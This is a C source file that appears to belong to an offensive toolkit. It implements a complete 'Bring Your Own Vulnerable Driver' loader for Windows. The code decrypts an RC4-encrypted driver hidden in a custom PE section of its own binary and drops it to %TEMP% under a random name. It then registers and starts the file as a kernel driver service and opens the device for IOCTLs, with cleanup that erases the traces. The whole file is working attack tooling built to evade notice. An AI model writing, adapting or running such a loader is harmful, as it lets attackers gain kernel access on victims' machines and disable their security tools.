/*
 * BYOVD Loader
 *
 * Extracts the driver embedded in the .jdrv PE section by packer.cpp,
 * decrypts it, drops it to %TEMP%, registers it as a kernel driver
 * service, starts it, and opens a handle to its device object.
 * Windows only.
 *
 * .jdrv section layout (matches packer.cpp embedDriver):
 *   [0..7]   magic    "JOCKYDRV"
 *   [8..11]  origSize uint32_t  (plaintext driver size)
 *   [12..27] key      16-byte RC4 key
 *   [28..]   data     RC4-encrypted driver bytes
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <winsvc.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

static const uint8_t JDRV_MAGIC[8] = {'J','O','C','K','Y','D','R','V'};

/* ── RC4 – must match packer.cpp exactly ─────────────────────────────── */

static void byovd_rc4(uint8_t* data, size_t len, const uint8_t* key)
{
    uint8_t  S[256];
    uint32_t i, j = 0;
    for (i = 0; i < 256; i++) S[i] = (uint8_t)i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % 16]) & 0xFF;
        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
    }
    i = 0; j = 0;
    for (size_t n = 0; n < len; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
        data[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

/* ── Locate .jdrv in the running binary's in-memory image ───────────── */

static uint8_t* find_jdrv_section(uint32_t* out_size)
{
    BYTE* base = (BYTE*)GetModuleHandleA(NULL);
    if (!base) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        /* Section name ".jdrv" is 5 chars; remaining bytes are null. */
        if (strncmp((char*)sec[i].Name, ".jdrv", 5) == 0) {
            *out_size = sec[i].Misc.VirtualSize;
            return base + sec[i].VirtualAddress;
        }
    }
    return NULL;
}

/* ── Fast LCG-based random hex string (no CRT rand dependency) ───────── */

static void rand_hex8(char out[9])
{
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    uint64_t seed = ((uint64_t)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    seed ^= (uint64_t)GetCurrentProcessId() * 0x9e3779b97f4a7c15ULL;
    for (int i = 0; i < 8; i++) {
        seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
        out[i] = "0123456789abcdef"[(seed >> 33) & 0xF];
    }
    out[8] = '\0';
}

/* ── Public API ──────────────────────────────────────────────────────── */

bool jocky_byovd_load(const char*    service_name,
                      const char*    device_name,
                      jocky_byovd_t* out)
{
    if (!out) return false;

    /* Zero-initialise output so jocky_byovd_unload is always safe to call. */
    memset(out, 0, sizeof(*out));
    out->device = INVALID_HANDLE_VALUE;

    /* 1. Find and validate the .jdrv section. */
    uint32_t sec_size = 0;
    uint8_t* sec_data = find_jdrv_section(&sec_size);
    if (!sec_data || sec_size < 29u)          return false;
    if (memcmp(sec_data, JDRV_MAGIC, 8) != 0) return false;

    uint32_t       orig_size = *(uint32_t*)(sec_data + 8);
    const uint8_t* rc4_key   = sec_data + 12;
    const uint8_t* encrypted = sec_data + 28;

    if (28u + orig_size > sec_size) return false;

    /* 2. Decrypt driver bytes into a dedicated RW allocation. */
    uint8_t* drv_buf = (uint8_t*)VirtualAlloc(NULL, orig_size,
                                               MEM_COMMIT | MEM_RESERVE,
                                               PAGE_READWRITE);
    if (!drv_buf) return false;
    memcpy(drv_buf, encrypted, orig_size);
    byovd_rc4(drv_buf, orig_size, rc4_key);

    /* 3. Drop to %TEMP%\<rand8>.sys */
    char tmp_dir[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tmp_dir)) {
        VirtualFree(drv_buf, 0, MEM_RELEASE);
        return false;
    }

    char hex8[9];
    rand_hex8(hex8);
    _snprintf(out->driver_path, MAX_PATH, "%s%s.sys", tmp_dir, hex8);

    HANDLE hf = CreateFileA(out->driver_path, GENERIC_WRITE, 0, NULL,
                            CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        VirtualFree(drv_buf, 0, MEM_RELEASE);
        out->driver_path[0] = '\0';
        return false;
    }
    DWORD written = 0;
    BOOL  wr_ok   = WriteFile(hf, drv_buf, orig_size, &written, NULL);
    CloseHandle(hf);
    VirtualFree(drv_buf, 0, MEM_RELEASE);

    if (!wr_ok || written != orig_size) {
        DeleteFileA(out->driver_path);
        out->driver_path[0] = '\0';
        return false;
    }

    /* 4. Determine service name. */
    if (service_name && service_name[0]) {
        strncpy(out->service_name, service_name, 63);
    } else {
        char hex2[9];
        rand_hex8(hex2);
        _snprintf(out->service_name, sizeof(out->service_name), "jky_%s", hex2);
    }

    /* 5. Register as a kernel driver service in SCM. */
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        DeleteFileA(out->driver_path);
        out->driver_path[0] = '\0';
        out->service_name[0] = '\0';
        return false;
    }

    SC_HANDLE hSvc = CreateServiceA(
        hSCM,
        out->service_name,        /* service name */
        out->service_name,        /* display name */
        SERVICE_START | SERVICE_STOP | DELETE,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        out->driver_path,         /* full path to .sys */
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc && GetLastError() == ERROR_SERVICE_EXISTS) {
        hSvc = OpenServiceA(hSCM, out->service_name,
                            SERVICE_START | SERVICE_STOP | DELETE);
    }

    if (!hSvc) {
        CloseServiceHandle(hSCM);
        DeleteFileA(out->driver_path);
        out->driver_path[0]  = '\0';
        out->service_name[0] = '\0';
        return false;
    }

    /* 6. Start the service (ignore ERROR_SERVICE_ALREADY_RUNNING). */
    if (!StartServiceA(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hSCM);
            DeleteFileA(out->driver_path);
            out->driver_path[0]  = '\0';
            out->service_name[0] = '\0';
            return false;
        }
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    /* 7. Open the device handle (best-effort; driver may not expose a symlink). */
    char dev_path[MAX_PATH];
    const char* dname = (device_name && device_name[0]) ? device_name
                                                         : out->service_name;
    _snprintf(dev_path, MAX_PATH, "\\\\.\\%s", dname);

    out->device = CreateFileA(dev_path,
                              GENERIC_READ | GENERIC_WRITE,
                              0, NULL, OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL, NULL);
    /* out->device may be INVALID_HANDLE_VALUE if the driver has no symlink;
     * that is not fatal – the caller can still send IOCTLs after resolving
     * the device path another way. */
    return true;
}

void jocky_byovd_unload(jocky_byovd_t* ctx)
{
    if (!ctx) return;

    /* Close the device handle first. */
    if (ctx->device != INVALID_HANDLE_VALUE && ctx->device) {
        CloseHandle(ctx->device);
        ctx->device = INVALID_HANDLE_VALUE;
    }

    /* Stop and delete the SCM service. */
    if (ctx->service_name[0]) {
        SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
        if (hSCM) {
            SC_HANDLE hSvc = OpenServiceA(hSCM, ctx->service_name,
                                          SERVICE_STOP | DELETE);
            if (hSvc) {
                SERVICE_STATUS ss;
                ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
                Sleep(500); /* give the driver time to unload */
                DeleteService(hSvc);
                CloseServiceHandle(hSvc);
            }
            CloseServiceHandle(hSCM);
        }
        ctx->service_name[0] = '\0';
    }

    /* Delete the dropped .sys from disk. */
    if (ctx->driver_path[0]) {
        DeleteFileA(ctx->driver_path);
        ctx->driver_path[0] = '\0';
    }
}

#endif /* _WIN32 */
